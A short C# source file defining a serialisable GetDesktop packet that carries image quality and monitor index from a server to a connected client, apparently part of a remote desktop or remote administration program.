using Serveur.Controllers.Server;
using ZeroFormatter;

namespace Serveur.Packets.ServerPackets
{
    [ZeroFormattable]
    public class GetDesktop : IPackets
    {
        public override TypePackets Type
        {
            get
            {
                return TypePackets.GetDesktop;
            }
        }

        [Index(0)]
        public virtual int quality { get; set; }

        [Index(1)]
        public virtual int monitor { get; set; }

        public GetDesktop()
        {
        }

        public GetDesktop(int quality, int monitor)
        {
            this.quality = quality;
            this.monitor = monitor;
        }

        public void Execute(ClientMosaic client)
        {
            client.send(this);
        }
    }
}
